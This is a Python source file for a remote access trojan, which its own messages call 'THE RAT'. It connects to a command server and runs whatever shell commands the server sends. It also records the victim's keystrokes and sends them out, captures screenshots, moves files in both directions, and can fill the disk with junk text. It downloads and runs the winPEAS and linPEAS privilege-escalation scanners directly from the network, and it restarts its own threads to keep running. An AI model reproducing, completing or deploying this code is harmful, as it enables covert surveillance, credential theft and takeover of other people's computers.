import os
import platform
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime
import keyboard
import pyscreenshot
import select

########## VARIABLES ###########
conn = None
host = "127.0.0.1"
thread = None
port = 5656
dataTemp = None
connected = False
# stop = FLAG TO PAUSE THE THREAD
stop = False
runThread = True
keyLog = True
initialized = False

#Timer to check the connection (seconds)
checkerTimeout = 1.5
log = ""
logs = True
threads = []
################################

def connect():
    global conn,host,port
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((host,port))
    except socket.error:
        time.sleep(4)
        conn = None


def sendBytes(bytesToSend):
    global conn
    if conn != None:
        conn.sendall(bytesToSend)
        
def ripper():

    filename = "megablostyfile.bloste"
    corruptedText = """C̵̥̗̰͖͊̿͐̀̌́̋̓͠ͅỎ̵̡̢̨̝̪̬͉̮̳͙͇͔̪̥͈̺̻̗̟̥̩̺̮̰͙͓͇̦̝̮͉̭̥̱͇͉̉̈́̈͒́́́́̋͛͌̏̀͌́̉̍̀̊̐̇̋̃̊́̎̈́̓͂͛̍̀̅͆́̐̐̑̕̚̕̕͝͝R̸̢̛͙̃͐̅̀̇̈̉́̈́̔́̄̊̊̆͆̀̽̎̿̃̄͌̒̅͑̐̀̈͛́̎̒̋͌̕͘̚͝Ȓ̷̢̢͕̮͎͓̬͎̯̣̟̞͔̺̯͈̭̱̍̃́́̄̿̂̉̒̈́͜Ṵ̸̧̢̨̼͙̞̜͙͉̪̝͍͈̫̻̪̩̦̝̙̼̖̹̮͚́̐̄͐̃̓͋̑̓͆͆̿͗̓͛̏͌͒̈́͘͘͜͜͜͠ͅṖ̷͙͍̲̹͇̰̮͗̓͆̇́̀̾̈́̎́͋̄̊̒͐̈͐̒́̐̔̀̃͘̚͝͝ͅͅT̸̡̨̢̨̗̩̭̣̹̭̘̞̯͕̙̗̹̖͈̰̳̘̪͎̙͉̲̳͛̄͗̾͜͜͜ͅͅȨ̸̛̛̛̹̟̲̬̰͖̥̞͈̯̭͈̫̜̻̟͍̗̙͉̙̺̬̭̔̽̀̓̓͂̆̾̀̇̇͊͋̈́̆͌̃̅̾́̅͂͊͆̑̂̒̇̋̐̊̒̆̈͛̈́̌͋̔̇̚͠͝͠D̸̡̫͚̳͔͔̞͓̈̉͊̀́͒͛̒̂̓̅͛͌̀͘ ̷̧̛̪̰͓͉̗̤̩̩̭̼̙̙̮͓̯̜̬͓́̄͊́̐̀̑͛̋̓̐̽̏̈́̑͒́̌̔̅̿̎̈͆͂͆̇̅͌̍͌͌̓̒̏̔̚͘B̶̧̡̢͔͔̭̹͓̓̀́̈̆̂̀̔͋̂͆͛̔͘͘͠͠Y̴̢̧̨̡̧̛̠̦̦̺͉̺̜͇̜̥̭̳̫̣̮̼̝̖͙͉͉̟̦͈̻͇͖̗̮̺̦͊̿͊̈́̀̈́͆̊͋̏̆̑͊̊̓͑̀̉̉̀̀̇̽͒͌̔͒̚͘̕͘͝ ̸̢̛̟͙̯̯̥͖͓̜͔̩͓̫͈̜̺͚͕̄͂́̃́͒̃̿͊͋͂͂̆̆̀̽̆̈́͗̍̋̿̒̍͊͗̈́̉͘͝͠Ķ̴̠̘̣͙̮̬͉͇̙͊͌̕ͅĄ̶̡̛̻̺͔͙̘͔̺̖̭͖̥̺͓̗̙̝̫̖̱̖͕͖͉͍̞̪͈͓̳̪̟͓͎͎̲͓̝͚̄͛̿̏̒̄̊̆͒̈̉͂̾͛̏̑̾̑̈́̾͗̅͊̒͌̌̓̄̂̀̒̀̋̀̄̕͜͠͠͝͠ͅͅǪ̶̫̫͈̮̗͖͕͓̫̤̠̗͓͉̖̯̳͕̺̼̠̝͔͖͇͕͖̤̱̈́S̸̢̢̢̜̝̟͈̰̱̜͚͔̙̦̟̰̩͈̮͙̝͚̖̱̞̥̠̞̥͕͎̤͎̻̺͖̩̫̖̖͙̜̦̟̈̎̊̾͒̏̈́͗͜͜"""
    writerNumber = 100000
    with open(filename,"w") as f:
        currentNumber = 0
        while currentNumber < writerNumber:
            f.write(corruptedText)
            currentNumber += 1



def send(message):
    global conn
    if (conn != None and message != None):
        conn.sendall(message.encode())

def recive():
    global conn,checkerTimeout
    if (conn != None):
        ready, _, _ = select.select([conn], [], [], checkerTimeout)
        if ready:
            data = conn.recv(4096)
            return data.decode()
        
def saveFile(text,name):
    try:
        with open(name,"w") as f:
            f.write(text)
    except Exception as e:
        logEvents(e)
        
        
def readFile(path,asBytes):
    try:
        operation = "r"
        if asBytes:
            operation += "b"
        with open(path,operation) as f:
            return f.read()
    except Exception as e:
        logEvents(e)
            

def winPEAS(force):
    #IMPLEMENTAR WINPEAS
    urlLatestVersion = "$url = \"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\""
    oneLiner = "$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest \"$url\" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(\"\")"
    
    send("EXECUTING WINPEAS...")
    #You can force to execute winpeas instead reading the file of first time execution
    if not os.path.exists("rec.txt") or force == True:
        execute("del /Q rec.txt")
        execute(f"powershell -c \"{urlLatestVersion}\"")
        saveFile(execute(f"powershell -c \"{oneLiner}\""),"rec.txt")
        send(readFile("rec.txt",True))
    else:
        send(readFile("rec.txt",True))
        

# VULNERABILITY SCAN FOR LINUX    
def linPEAS(force):

    global stop
    oneLiner = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    existsFile = os.path.exists("rec.txt")
    if not existsFile or force == True:
        if existsFile: 
            execute("rm -f rec.txt")
        stop = True
        saveFile(execute(oneLiner),"rec.txt")
        sendFileByteMode("rec.txt")
    else:
        sendFileByteMode("rec.txt")


def sysInfo():
    return f"""
    -------------------------------------
    OPERATIVE SYSTEM: {platform.system()}
    NODE NAME: {platform.node()}
    SYSTEM VERSION: {platform.version()}
    PROCESSOR: {platform.processor()}
    PLATAFORM: {platform.platform()}
    -------------------------------------
    """

def execute(command):
    global log,logs
    try:
            if sys.platform == "win32":
                result = subprocess.run(
                    f"cmd.exe /c {command}",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True )


            else:
            
                result = subprocess.run(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
            
            dev = ""
            if result.returncode == 0:
                dev = result.stdout
            else:
                dev = result.stderr


            return dev
        
    except Exception as e:
        logEvents(e)
        
            
  
def logEvents(e):
    global log,logs
    if logs:
        log += str(datetime.now()) + " ->  " + str(e) + f"\n"
  
            
def sendLen(file):
    filesize = os.path.getsize(file)
    send("len-" + str(filesize) + "-")

# Screenshot
def capture_screen():
    global stop,conn
    try:
        screenshot = pyscreenshot.grab()
        screenshot.save("screenshot.png")
        send_screenshot()
    except Exception as e:
        logEvents(e)
        stop = False
        conn = None

# Sends the screenshot to the server
def send_screenshot():
        global stop,conn,log,logs
        try:
            with open("screenshot.png", "rb") as f:
                sendLen("screenshot.png")
                dat = f.read()
                sendBytes(dat)
                
            
            # WINDOWS
            if sys.platform == "win32":
                execute("del /Q screenshot.png")
            # LINUX
            else:
                execute("rm -f screenshot.png")
            stop = False 
        except Exception as a:
            logEvents(a)
            stop = False
            conn = None
            

def getStatus():
    global conn,host,port,connected,logs
    return f""" 
    SOCKET: {conn}
    HOST: {host}
    PORT: {port}
    CONNECTED: {connected}
    LOGS: {logs}
    """
    
def hibernateProgram(seconds):
    global runThread,thread,conn,connected
    try:
        # STOPS THE THREAD
        send(f"HIBERNATING THE RAT {seconds} SECONDS , BYEE!!")
        conn = None
        connected = False
        runThread = False
        thread.join()
        thread = None
        time.sleep(int(seconds))
    except Exception as e:
        logEvents(e)
        
    finally:
        runThread = True
        thread = threading.Thread(target=checkConnection)
        thread.start()
    
def filterValue(regex,text):
    return text.split(regex)
    
# CONCATS TEXT TO A FILE
def concatToFile(text,file):
    try:
        with open(file,"a") as f:
            f.write(text)
    except Exception as e:
        logEvents(e)        
           
 # FILTER THE COMMANDS RECIVED           
def filterCommand(command):
    global stop,logs
    try:
        if command == "screenshot":
            stop = True
            capture_screen()
        elif command == "status":
            send(getStatus())
        elif command == "system info":
            send(sysInfo())
            
            
        # LOGS
        elif command == "logs true":
            logs = True
        elif command == "logs false":
            logs = False
        elif command == "show logs":
            send(log)
        
        #LINPEAS
        elif command == "linpeas":
            linPEAS(False)
        elif command == "linpeas force":
            linPEAS(True)
            
        #WINPEAS
        elif command == "winpeas":
            winPEAS(False)
        elif command == "winpeas force":
            winPEAS(True)
        #DIRECTORY MOVEMENT
        elif "cd " in command:
            changeCurrentPath(command.split(" ")[1])
        elif command == "pwd":
            send(currentDir())
        # DOWNLOAD FILES
        elif "download-" in command:
            sendFileByteMode(command.split("-")[1])
        # UPLOAD FILES 
        elif "put-" in command:
            stop = True
            filename = command.split("-")[1]
            print(filename)
            recvFiles(filename)
        #MEMORY RIPPER    
        elif command == "memory ripper":
            ripper()
        elif "hibernate-" in command:
            seconds = filterValue("-",command)[1]
            hibernateProgram(seconds)
    
        # SENDS THE KEYS TO THE SERVER
        elif command == "get keylogs":
            sendFileByteMode("keys.txt")
            # CLEANS THE FILE OVERWRITING IT
            saveFile("","keys.txt")
        else:
            send(execute(dataTemp))
    except Exception as e:
        logEvents(e)
        stop = False
        
        
def recvLen():
    global conn
    i = 0
    while i < 10:  
        try:
            dat = conn.recv(1024)
            decoded = dat.decode()
            if "len-" in decoded:
                return int(decoded.split("-")[1])
        except Exception as f:
            print(f)
            

def recvFiles(filename):
    global conn, stop
    try:
        print("RECV LENGTH ...")
        ln = recvLen()
        print ("len : " + str(ln))
        totalRecv = 0
        if ln != None:
            with open(filename, "wb") as f:
                while totalRecv != ln:
                    data = conn.recv(4096)
                    f.write(data)
                    totalRecv += len(data)
            print("SAVED")
            stop = False
    
    except Exception as e:
        print(e)
        logEvents(e)
        stop = False 
        

# Grabs the keys pressed on the victims computer
# We use a proccess instead of threads to improve the performance 
def kLogger():
    global keyLog
    buffer = ""
    if not os.path.exists("keys.txt"):
        saveFile("","keys.txt")

    # FILTERS THE PRESSED KEY
    def filterKey(key):
        
        formattedKey = ""
        
        if key == "space" or key == "espacio":
            formattedKey = " "
        elif key == "enter":
            formattedKey = "\n"
        elif key == "backspace" or key == "retroceso":
            formattedKey = " <- "
        else:
            formattedKey = key
            
        return formattedKey
    
    while keyLog:
        try:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:  
                buffer += filterKey(event.name) 
                if len(buffer) > 10:
                    concatToFile(buffer, "keys.txt")
                    buffer = ""  
            
           
                  
        except Exception as e:
            logEvents(e)

# DIRECTORY MOVEMENT AT EJECUTION TIME            

def currentDir():
    return os.getcwd()


def changeCurrentPath(newPath):
    try:
        os.chdir(newPath)
    except Exception as e:
        logEvents(e)
   
   
# SENDS A LOCAL FILE TO THE SERVER
def sendFileByteMode(file):
    global stop
    try:
        sendLen(file)
        data = readFile(file, True)
        sendBytes(data)
        time.sleep(1)
        stop = False
        
    except Exception as e:
        logEvents(e)       
        stop = False  

def threadPersistFunction():
    global threads
    while True:
        for thread in threads:
            if not thread.is_alive():
                thread.start()

#CHECKS THE CONNECTION BY PING/PONG METHOD
def checkConnection():
    global runThread
    while runThread:
        try:    
            global conn,dataTemp,connected,stop,log,logs
            if not stop:
                send("/check891231")
                dat = recive()
                if dat:
                    connected = True
                    if not "/check891231" in dat:
                        dataTemp = dat
                else:
                    connected = False
                    conn = None
                    connect()
            else:
                time.sleep(3)
        except Exception as e:
            logEvents(e)
            time.sleep(1.5)
            conn = None
            connected = False
            
if __name__ == '__main__':
    
    if not initialized:
        thread = threading.Thread(target=checkConnection)
        thread.start()
        keyThread = threading.Thread(target=kLogger)
        keyThread.start()
        threads.append(threading.main_thread())
        threads.append(thread)
        threads.append(keyThread)
        initialized = True
    for i in range(threads):
        persistThread = threading.Thread(target=threadPersistFunction)
        persistThread.start()
        threads.append(persistThread)
    while True:
        if connected:
            time.sleep(1)
            if dataTemp:
                filterCommand(dataTemp)
                dataTemp = None
        else:
            time.sleep(4)